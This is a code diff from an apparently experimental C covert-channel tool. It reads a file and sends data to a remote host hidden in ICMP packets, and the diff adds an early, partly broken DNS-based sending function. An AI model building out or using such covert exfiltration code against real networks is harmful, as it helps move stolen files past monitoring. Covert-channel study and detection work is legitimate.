@@ -7,9 +7,12 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <sys/socket.h>
+#include "headers/dns.h"
+
 
 uint16_t icmp_chk(void *buffer, int len);
 int covert_icmp(struct in_addr *dst, char *data, int code);
+int covert_dns(struct in_addr *dst, char *data, int code);
 
 int main(int argc, char *argv[]) {
     FILE *fp = fopen(argv[1], "rb");
@@ -29,11 +32,57 @@ int main(int argc, char *argv[]) {
 
     dst = (struct in_addr *)host->h_addr_list[0];
     
-    covert_icmp(dst, "filetest.c", 1101);
-    covert_icmp(dst, data, 1102);
-    covert_icmp(dst, "abcdefghij", 1103);
+    //covert_icmp(dst, "filetest.c", 1101);
+    //covert_icmp(dst, data, 1102);
+    //covert_icmp(dst, "abcdefghij", 1103);
+    covert_dns(dst, "blah", 1101);
     return 0;
 }
+
+
+int covert_dns(struct in_addr *dst, char *data, int code) {
+    struct dnshdr dns_hdr;
+    struct sockaddr_in addr;
+
+    unsigned char packet[2048];
+    
+    int ch;
+    int chunk = 1;
+    int chunk_size = 500;
+    int on = 1;
+
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if(sock <0) {
+        perror("socket");
+        return 1;
+    }
+
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
+
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_addr = *dst;
+    addr.sin_port = 53;
+
+    memset(&dns_hdr, 0, sizeof(dns_hdr));
+    dns_hdr.aa = 1;
+
+    memcpy(packet, &dns_hdr, sizeof(dns_hdr));
+    memcpy(packet + sizeof(dns_hdr), "testing", 7);
+
+    if((ch = sendto(sock, packet, sizeof(dns_hdr)+7, 0,
+                (struct sockaddr*)&addr, sizeof(addr))) <=0) {
+        
+        perror("sendto");
+        return -1;
+    }
+
+    close(sock);
+
+    return 0;
+}
+
+
 
 int covert_icmp(struct in_addr *dst, char *data, int code) {
     struct icmphdr icmp_hdr;
